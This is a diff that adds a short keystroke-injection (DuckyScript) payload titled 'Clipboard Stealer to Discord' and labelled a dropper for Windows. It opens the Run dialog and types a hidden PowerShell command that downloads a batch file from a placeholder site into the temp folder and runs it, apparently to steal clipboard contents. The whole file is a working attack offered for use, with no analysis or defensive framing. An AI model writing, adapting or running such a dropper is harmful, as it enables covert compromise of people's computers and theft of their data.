@@ -1,0 +1,12 @@
+REM Title: Clipboard Stealer to Discord
+REM Author: 7h30th3r0n3
+REM Target: Windows 7/8/10/11
+REM Version: 1
+REM Category: Dropper
+DELAY 500
+REM Open PowerShell via Run dialog
+GUI r
+DELAY 500
+REM Use a single line to download and execute scripts
+STRING powershell -w hidden -c "cd $env:TEMP;iwr https://<site>/x.bat -o x.bat;start x.bat;exit"
+ENTER
